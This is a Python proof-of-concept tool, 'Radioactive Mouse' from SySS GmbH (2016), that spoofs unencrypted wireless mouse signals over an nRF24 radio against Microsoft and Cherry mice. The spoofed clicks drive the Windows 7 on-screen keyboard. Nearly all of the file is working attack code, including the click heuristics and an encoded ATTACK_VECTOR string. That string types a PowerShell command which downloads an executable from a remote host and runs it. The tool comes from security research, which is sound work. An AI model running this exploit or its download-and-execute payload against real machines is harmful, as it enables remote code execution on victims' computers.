#!/usr/bin/env python2
# -*- coding: utf-8 -*-

"""
  Radioactive Mouse

  by Matthias Deeg <matthias.deeg@syss.de>

  Proof-of-Concept software tool to demonstrate mouse spoofing attacks
  exploiting unencrypted and unauthenticated wireless mouse
  communication

  Copyright (C) 2016 SySS GmbH

  This program is free software: you can redistribute it and/or modify
  it under the terms of the GNU General Public License as published by
  the Free Software Foundation, either version 3 of the License, or
  (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You should have received a copy of the GNU General Public License
  along with this program.  If not, see <http://www.gnu.org/licenses/>.
"""

__version__ = 0.8
__author__ = 'Matthias Deeg'

import argparse
import time
from lib import nrf24, mouse
from sys import exit

WAIT    = 0
MOVE    = 1
CLICK   = 2

DELAY       = 0.3
MOVE_DELAY  = 0.17
CLICK_DELAY = 0.02                                  # 20 milliseconds delay for mouse clicks

# Windows On-Screen Keyboard (OSK) key coordinates (Windows 7)
KEY_A                   = (1, 2)
KEY_B                   = (6, 3)
KEY_C                   = (4, 3)
KEY_D                   = (3, 2)
KEY_E                   = (3, 1)
KEY_F                   = (4, 2)
KEY_G                   = (5, 2)
KEY_H                   = (6, 2)
KEY_I                   = (8, 1)
KEY_J                   = (7, 2)
KEY_K                   = (8, 2)
KEY_L                   = (9, 2)
KEY_M                   = (8, 3)
KEY_N                   = (7, 3)
KEY_O                   = (9, 1)
KEY_P                   = (10, 1)
KEY_Q                   = (1, 1)
KEY_R                   = (4, 1)
KEY_S                   = (2, 2)
KEY_T                   = (5, 1)
KEY_U                   = (7, 1)
KEY_V                   = (5, 3)
KEY_W                   = (2, 1)
KEY_X                   = (3, 3)
KEY_Y                   = (6, 1)
KEY_Z                   = (2, 3)
KEY_1                   = (2, 0)
KEY_2                   = (3, 0)
KEY_3                   = (4, 0)
KEY_4                   = (5, 0)
KEY_5                   = (6, 0)
KEY_6                   = (7, 0)
KEY_7                   = (8, 0)
KEY_8                   = (9, 0)
KEY_9                   = (10, 0)
KEY_0                   = (11, 0)
KEY_ESC                 = (0, 0)
KEY_RETURN              = (13, 2)
KEY_BACKSPACE           = (14, 0)
KEY_SPACE               = (3, 4)
KEY_MINUS               = (12, 0)
KEY_SLASH               = (11, 3)
KEY_CAPS_LOCK           = (0, 2)
KEY_EQUAL               = (13, 0)
KEY_BRACKET_LEFT        = (11, 1)
KEY_BRACKET_RIGHT       = (12, 1)
KEY_BACKSLASH           = (13, 1)
KEY_COMMA               = (9, 3)
KEY_PERIOD              = (10, 3)
KEY_SHIFT_LEFT          = (0, 3)
KEY_SHIFT_RIGHT         = (12, 3)
KEY_ALT_LEFT            = (2, 4)
KEY_ALT_RIGHT           = (7, 4)
KEY_GRAVE               = (1, 0)
KEY_EUROPE_1            = (12, 2)
KEY_EUROPE_2            = (1, 3)
KEY_APOSTROPHE          = (11, 3)
KEY_SEMICOLON           = (10, 3)
KEY_GUI_LEFT            = (1, 4)


# key mapping for printable characters of default German keyboard layout
KEYMAP_GERMAN = {
        ' ' : (KEY_SPACE, ),
        '!' : (KEY_SHIFT_LEFT, KEY_1),
        '"' : (KEY_SHIFT_LEFT, KEY_2),
        '#' : (KEY_EUROPE_1),
        '$' : (KEY_SHIFT_LEFT, KEY_4),
        '%' : (KEY_SHIFT_LEFT, KEY_5),
        '&' : (KEY_SHIFT_LEFT, KEY_6),
        '(' : (KEY_SHIFT_LEFT, KEY_8),
        ')' : (KEY_SHIFT_LEFT, KEY_9),
#        '*' : (KEY_MULTIPLY, ),
#        '+' : (KEY_PLUS, ),
        ',' : (KEY_COMMA, ),
        '-' : (KEY_SLASH, ),
        '.' : (KEY_PERIOD, ),
        '/' : (KEY_SHIFT_LEFT, KEY_7),
        '0' : (KEY_0, ),
        '1' : (KEY_1, ),
        '2' : (KEY_2, ),
        '3' : (KEY_3, ),
        '4' : (KEY_4, ),
        '5' : (KEY_5, ),
        '6' : (KEY_6, ),
        '7' : (KEY_7, ),
        '8' : (KEY_8, ),
        '9' : (KEY_9, ),
        ':' : (KEY_SHIFT_LEFT, KEY_PERIOD),
        ';' : (KEY_SHIFT_LEFT, KEY_COMMA),
        '<' : (KEY_EUROPE_2),
        '=' : (KEY_SHIFT_LEFT, KEY_0),
        '>' : (KEY_SHIFT_LEFT, KEY_EUROPE_2),
        '?' : (KEY_SHIFT_LEFT, KEY_MINUS),
        '@' : (KEY_ALT_RIGHT, KEY_Q),
        'A' : (KEY_SHIFT_LEFT, KEY_A),
        'B' : (KEY_SHIFT_LEFT, KEY_B),
        'C' : (KEY_SHIFT_LEFT, KEY_C),
        'D' : (KEY_SHIFT_LEFT, KEY_D),
        'E' : (KEY_SHIFT_LEFT, KEY_E),
        'F' : (KEY_SHIFT_LEFT, KEY_F),
        'G' : (KEY_SHIFT_LEFT, KEY_G),
        'H' : (KEY_SHIFT_LEFT, KEY_H),
        'I' : (KEY_SHIFT_LEFT, KEY_I),
        'J' : (KEY_SHIFT_LEFT, KEY_J),
        'K' : (KEY_SHIFT_LEFT, KEY_K),
        'L' : (KEY_SHIFT_LEFT, KEY_L),
        'M' : (KEY_SHIFT_LEFT, KEY_M),
        'N' : (KEY_SHIFT_LEFT, KEY_N),
        'O' : (KEY_SHIFT_LEFT, KEY_O),
        'P' : (KEY_SHIFT_LEFT, KEY_P),
        'Q' : (KEY_SHIFT_LEFT, KEY_Q),
        'R' : (KEY_SHIFT_LEFT, KEY_R),
        'S' : (KEY_SHIFT_LEFT, KEY_S),
        'T' : (KEY_SHIFT_LEFT, KEY_T),
        'U' : (KEY_SHIFT_LEFT, KEY_U),
        'V' : (KEY_SHIFT_LEFT, KEY_V),
        'W' : (KEY_SHIFT_LEFT, KEY_W),
        'X' : (KEY_SHIFT_LEFT, KEY_X),
        'Y' : (KEY_SHIFT_LEFT, KEY_Z),
        'Z' : (KEY_SHIFT_LEFT, KEY_Y),
        '[' : (KEY_ALT_RIGHT, KEY_8),
        '\\' : (KEY_ALT_RIGHT, KEY_MINUS),
        ']' : (KEY_ALT_RIGHT, KEY_9),
        '^' : (KEY_GRAVE),
        '_' : (KEY_SHIFT_LEFT, KEY_SLASH),
        '`' : (KEY_SHIFT_LEFT, KEY_EQUAL),
        'a' : (KEY_A, ),
        'b' : (KEY_B, ),
        'c' : (KEY_C, ),
        'd' : (KEY_D, ),
        'e' : (KEY_E, ),
        'f' : (KEY_F, ),
        'g' : (KEY_G, ),
        'h' : (KEY_H, ),
        'i' : (KEY_I, ),
        'j' : (KEY_J, ),
        'k' : (KEY_K, ),
        'l' : (KEY_L, ),
        'm' : (KEY_M, ),
        'n' : (KEY_N, ),
        'o' : (KEY_O, ),
        'p' : (KEY_P, ),
        'q' : (KEY_Q, ),
        'r' : (KEY_R, ),
        's' : (KEY_S, ),
        't' : (KEY_T, ),
        'u' : (KEY_U, ),
        'v' : (KEY_V, ),
        'w' : (KEY_W, ),
        'x' : (KEY_X, ),
        'y' : (KEY_Z, ),
        'z' : (KEY_Y, ),
        '{' : (KEY_ALT_RIGHT, KEY_7),
        '|' : (KEY_ALT_RIGHT, KEY_EUROPE_2),
        '}' : (KEY_ALT_RIGHT, KEY_0), '~' : (KEY_ALT_RIGHT, KEY_BRACKET_RIGHT),
        u'\'' : (KEY_SHIFT_LEFT, KEY_EUROPE_1),
        u'Ä' : (KEY_SHIFT_LEFT, KEY_APOSTROPHE),
        u'Ö' : (KEY_SHIFT_LEFT, KEY_SEMICOLON),
        u'Ü' : (KEY_SHIFT_LEFT, KEY_BRACKET_LEFT),
        u'ä' : (KEY_APOSTROPHE, ),
        u'ö' : (KEY_SEMICOLON, ),
        u'ü' : (KEY_BRACKET_LEFT, ),
        u'ß' : (KEY_MINUS, ),
        u'€' : (KEY_ALT_RIGHT, KEY_E),
        u"\xE3" : (KEY_GUI_LEFT, ),
        u"\xF0" : (KEY_RETURN, ),
        u"\xF1" : (KEY_CAPS_LOCK, ),
        u"\xF2" : (KEY_EUROPE_1, ),
        u"\xF3" : (KEY_EUROPE_2, ),
        u"\xF4" : (KEY_SHIFT_LEFT, ),
        u"\xF5" : (KEY_SHIFT_RIGHT, ),
        u"\xF6" : (KEY_COMMA, ),
        u"\xF7" : (KEY_PERIOD, ),
        }


def actions_from_string(string, move_x = 23, move_y = 23, x_correction = 10, y_correction = 13):
    actions = []

    # current position (KEY_R)
    x_pos = 4
    y_pos = 1

    for c in string:
        # get moves for character
        if c == u"\xff":
            # special wait command
            actions.append((WAIT, MOVE_DELAY))
            continue
        elif c == u"\xfc":
            # special command for x correction
            actions.append((MOVE, 0, -1 * y_correction, 0))
            actions.append((WAIT, MOVE_DELAY))
            continue
        elif c == u"\xfd":
            # special command for x correction
            actions.append((MOVE, 0, -1 * y_correction / 2, 0))
            actions.append((WAIT, MOVE_DELAY))
            continue
        elif c == u"\xfe":
            # special command for x correction
            actions.append((MOVE, -3, 0, 0))
            actions.append((WAIT, MOVE_DELAY))
            continue

        char_moves = KEYMAP_GERMAN[c]

        # process each movement
        for m in char_moves:
            dx = m[0] - x_pos
            dy = m[1] - y_pos

            # calculate number of horizontal and vertical moves
            x_count = abs(dx)
            y_count = abs(dy)

            if dx < 0:
                mx = -1 * move_x
            else:
                mx = move_x

            if dy < 0:
                my = -1 * move_y
            else:
                my = move_y

            # add horizontal mouse movements
            for i in range(x_count):
                x_pos += mx / abs(mx)
                actions.append((MOVE, mx, 0, 0))
                actions.append((WAIT, MOVE_DELAY))

            # add vertical mouse movements
            for i in range(y_count):
                y_old = y_pos
                y_pos += my / abs(my)

                x_c = 0
                if y_old > y_pos:
                    x_c = -1 * x_correction
                elif y_old < y_pos:
                    x_c = x_correction

                # special treatment for transition to row 4
                if y_old == 3 and y_pos == 4:
                    my -= 3

                if y_old == 4 and y_pos == 3:
                    my += 3

                actions.append((MOVE, x_c, my, 0))
                actions.append((WAIT, MOVE_DELAY))

                # transition from row 2 to 3
                if y_pos - y_old == 1 and y_pos == 3:
                    actions.append((MOVE, -1 * move_x, 0, 0))
                    actions.append((WAIT, MOVE_DELAY))

                # transition from row 3 to 2
                if y_pos - y_old == -1 and y_pos == 2:
                    actions.append((MOVE, move_x, 0, 0))
                    actions.append((WAIT, MOVE_DELAY))

            # add mouse click
            actions.append((CLICK, mouse.MOUSE_BUTTON_LEFT))
            actions.append((WAIT, CLICK_DELAY))
            actions.append((CLICK, mouse.MOUSE_BUTTON_NONE))
            actions.append((WAIT, CLICK_DELAY))

    return (actions, )


# Windows 7, default mouse settings (move delay = 0.2, click delay = 0.02)
windows7_default_poc_start = [
# move mouse cursor to upper left screen corner and click
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
# move mouse cursor to lower left screen corner
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (MOVE, -128, 127, 0),
    (WAIT, MOVE_DELAY),
# move mouse cursor on Windows start button and click it
    (MOVE, 4, -4, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
# move mouse cursor on "All programs" menu entry and click it
    (WAIT, MOVE_DELAY),
    (MOVE, 24, -38, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_cherry_osk1 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -12, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_cherry_osk2 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -12, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_cherry_osk3 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -15, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -12, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_microsoft_osk1 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -16, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_microsoft_osk2 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -16, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_german_default_microsoft_osk3 = [
# start the on-screen keyboard
    (WAIT, MOVE_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -20, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 0, -16, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


windows7_default_poc_end = [
# move mouse cursor to upper left screen corner
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (MOVE, -128, -127, 0),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
# wait some seconds for Windows on-screen keyboard to start
    (WAIT, 2),
# move mouse cursor to the upper-left corner of the on-screen keyboard
    (MOVE, 42, 42, 0),
    (WAIT, MOVE_DELAY),
# classic Windows attack vector
    (MOVE, 32, 76, 0),                          # WIN
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
    (MOVE, 52, -38, 0),                         # r
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]


close_osk = [
    (WAIT, MOVE_DELAY),
#    (MOVE, 110, -76, 0),
    (MOVE, 75, -54, 0),
    (WAIT, MOVE_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_LEFT),
    (WAIT, CLICK_DELAY),
    (CLICK, mouse.MOUSE_BUTTON_NONE),
    (WAIT, CLICK_DELAY),
]

# classic Windows download & execute attack vector
ATTACK_VECTOR   = u"powershell (new-object System.Net.WebClient).DownloadFile\xf18\xf2\xf1http\xf1.77\xf1ptmd.sy.gs/s',\xf1\xf25temp5\xf1\xfc\xfe\\s.exe\xf1\xf29\xf6s\xf1tart-Process \xfd\xf1\xf25temp5\xf1\xfc\xfe\\s.exe'\xf0"

#ATTACK_VECTOR = u"cmd\xf0"


def banner():
    """Show a fancy banner"""

    print("        _____  ______ ___  _  _     _____  _                      _  \n"
"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
"                                                    __/ |             \n"
"                                                   |___/              \n"
"Radioactive Mouse v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))


def spoof_mouse_actions(heuristic):
    """Spoof mouse actions defined in given heuristic"""

    # input value "heuristic" is a list or tuple
    for h in heuristic:
        for a in h:
            if a[0] == MOVE:
                radio.transmit_payload(mickey.move(a[1], a[2], a[3]))
            elif a[0] == CLICK:
                radio.transmit_payload(mickey.click(a[1]))
            elif a[0] == WAIT:
                time.sleep(a[1])


# available heuristics for different target systems
HEURISTICS = {
    'win7_german' :
        { 'microsoft' :
            [
                windows7_default_poc_start + windows7_german_default_microsoft_osk1,
                windows7_default_poc_start + windows7_german_default_microsoft_osk2,
                windows7_default_poc_start + windows7_german_default_microsoft_osk3,
                windows7_default_poc_end
            ],
          'cherry' :
            [
                windows7_default_poc_start + windows7_german_default_cherry_osk1,
                windows7_default_poc_start + windows7_german_default_cherry_osk2,
                windows7_default_poc_start + windows7_german_default_cherry_osk3,
                windows7_default_poc_end
            ],
          'perixx' :
            [
# TODO
            ]
        }
}


# supported devices
DEVICES = {
    # Microsoft Wireless Mouse 2000
    'microsoft' : 'Microsoft',
    # Cherry Wireless Mouse (e. g. wireless desktop set B.UNLIMITED AES)
    'cherry' : 'Cherry',
    # Perixx Wireless Mouse (e. g. wireless desktop set PERIDUO-710W)
    'perixx' : 'Perixx'
}


if __name__ == '__main__':
    # show banner
    banner()

    # init argument parser
    parser = argparse.ArgumentParser()
    parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device', required=True)
    parser.add_argument('-c', '--channel', type=int, help='ShockBurst RF channel', required=True)
    parser.add_argument('-d', '--device', type=str, help='Target device (supported: microsoft, cherry)', required=True)
    parser.add_argument('-x', '--attack', type=str, help='Attack vector (available: win7_german)', required=True)

    # parse arguments
    args = parser.parse_args()

    try:
        # address of nRF24 mouse (CAUTION: Reversed byte order compared to sniffer tools!)
        # 90:FB:A1:96:32
        # address = "\x32\x96\xA1\xFB\x90"
        address = args.address.replace(':', '').decode('hex')[::-1][:5]
        address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
    except:
        print("[-] Error: Invalid address")
        exit(1)

    try:
        # used ShockBurst channel
        channel = args.channel

        if channel < 1 or channel > 80:
            raise Exception("Invalid channel")
    except Exception as error:
        print("[-] Error: {0}".format(error))
        exit(1)

    try:
        # initialize radio
        print("[*] Configure nRF24 radio")
        radio = nrf24.nrf24()

        # enable LNA
        radio.enable_lna()

        # put the radio in sniffer mode (ESB w/o auto ACKs)
        radio.enter_sniffer_mode(address)

        # set channel
        radio.set_channel(channel)
    except:
        print("[-] Error: Could not initialize nRF24 radio")
        exit(1)

    try:
        # initialize mouse
        print("[*] Initialize mouse: {0}".format(DEVICES[args.device]))

        if args.device == 'cherry':
            mickey = mouse.CherryMouse()
        elif args.device == 'microsoft':
            mickey = mouse.MicrosoftMouse()
        elif args.device == 'perixx':
            mickey = mouse.PerixxMouse()

    except Exception:
        print("[-] Error: Unsupported device")
        exit(1)

    # generate mouse actions
    print("[*] Generate mouse actions for selected attack vector 'Windows 7 Default, German keymap'")
    attack = actions_from_string(ATTACK_VECTOR, 23, 21, 10, 16)

    # start attack
    print("[*] Start mouse spoofing attack ...")

    # heuritics to start on-screen keyboard
    spoof_mouse_actions(HEURISTICS[args.attack][args.device])

    # heuristics for chosen attack vector
    spoof_mouse_actions(attack)

    # sleep before closing the on-screen virtual keyboard
    time.sleep(2)

    # close on-screen keyboard after attack
    spoof_mouse_actions((close_osk, ))

    print("[*] Done.")

